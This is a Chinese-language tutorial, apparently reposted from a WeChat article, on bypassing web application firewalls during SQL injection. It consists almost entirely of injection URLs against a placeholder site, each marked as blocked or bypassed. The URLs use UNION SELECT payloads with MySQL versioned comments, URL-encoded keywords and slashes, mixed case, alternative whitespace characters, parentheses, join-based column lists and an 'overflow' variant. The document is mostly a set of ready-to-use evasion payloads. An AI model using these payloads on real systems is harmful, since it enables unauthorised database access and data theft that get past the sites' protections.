# sql注入系列之（bypass waf 2）

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzU1NjgzOTAyMg==&mid=2247486260&idx=2&sn=ab8eb0fc8cd4562121d9bf34d64e2a74&chksm=fc3fb235cb483b23d0f2a3e72c1fca42a71c54701b0be0c17f9ecb2ea098934662c730f3333a&scene=126&sessionid=1681572510#rd](http://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247486260&idx=2&sn=ab8eb0fc8cd4562121d9bf34d64e2a74&chksm=fc3fb235cb483b23d0f2a3e72c1fca42a71c54701b0be0c17f9ecb2ea098934662c730f3333a&scene=126&sessionid=1681572510#rd)

今天我们继续来讲一下bypass waf的另一部分

例1:  

http://www.site.com/php?id=2 uNiOn-- - (waf)  
http://www.site.com/php?id=2 /\*!50000uNiOn\*/-- - (waf)

http://www.site.com/php?id=2 /\*!50000%75NiOn\*/-- - (waf) 

URL编码的反斜杠/  

%2f 来代替 /

             
http://www.site.com/php?id=2%2f\*!50000uNIOn\*%2f-- - (no waf)   http://www.site.com/php?id=2%2f\*!50000uNIOn\*%2f %2f\*!50000SeLeCt\*%2f -- - (no waf)

http://www.site.com/php?id=2%2f\*!50000uNIOn\*%2f %2f\*!50000SeLeCt\*%2f 1,2,3,4,5-- -   

就这样直接过了

  

例2：

使用url encoding关键词来bypass waf

http://www.site.com/php?id=2 uNiOn-- - \[400 bad request\]  

  

http://www.site.com/php?id=2 %75%6e%69%6f%6e-- -\[no waf\]  

http://www.site.com/php?id=2 %75%6e%69%6f%6e %73%65%6c%65%63%74%20 1,2,3,4,5-- -  
在这里 %75%6e%69%6f%6e 代替union， %73%65%6c%65%63%74%20 来代替 select

  

例3:  

http://www.site.com/php?id=2 union-- - \[internal server error 500\]  
http://www.site.com/php?id=2 uNiOn-- - \[no waf\]  
http://www.site.com/php?id=2 uNiOn SeLeCt-- - \[no waf\]   
http://www.site.com/php?id=2 uNiOn SeLeCt 1,2,3,4,5-- - \[bypassed\]

在这里使用大小写转换来完成

  

例4:

http://www.site.com/php?id=2 uNiOn-- - \[error connection timedout\]

在空格中使用%0b ， %0d ， %c0来bypass waf

http://www.site.com/php?id=2%0buNiOn %0b select %0b 1,2,3,4,5-- - \[bypassed\]

  

例5:  

直接上例子  
http://www.site.com/php?id=2 uNiOn-- - \[waf\]  
http://www.site.com/php?id=2uNiOn\-- - \[no waf\]   
http://www.site.com/php?id=2uNiOn SeLeCt-- - \[waf\]  
http://www.site.com/php?id=2uNiOn(SeLeCt 1,2,3,4,5)-- - \[bypassed

  

  

例6:

直接上例子

http://www.site.com/php?id=2 /\*!50000uNiOn\*/ /\*!50000SeLeCt\*/ %23 \[no waf\]  
http://www.site.com/php?id=2 /\*!50000uNiOn\*/ /\*!50000SeLeCt\*/ 1 %23 \[no waf\]  
http://www.site.com/php?id=2 /\*!50000uNiOn\*/ /\*!50000SeLeCt\*/ 1,2 %23 \[waf\]  
http://www.site.com/php?id=2 /\*!50000uNiOn\*/ /\*!50000SeLeCt\*/ 1,~~2 %23 \[no waf\]

http://www.site.com/php?id=2 /\*!50000uNiOn\*/ /\*!50000SelEct\*/ \* FROm (select 1)a

 join(SELECT 2)b join(select 3)c join(select 4)d join(select 5)e %23

例7:

溢出型bypass waf  

http://www.site.com/php?id=2

  

http://www.site.com/php?id=2%%0A /\*!50000uNiOn\*/ %%0A SeLeCt%%0A 1,2,3,4,5-- - \[bypassed \]
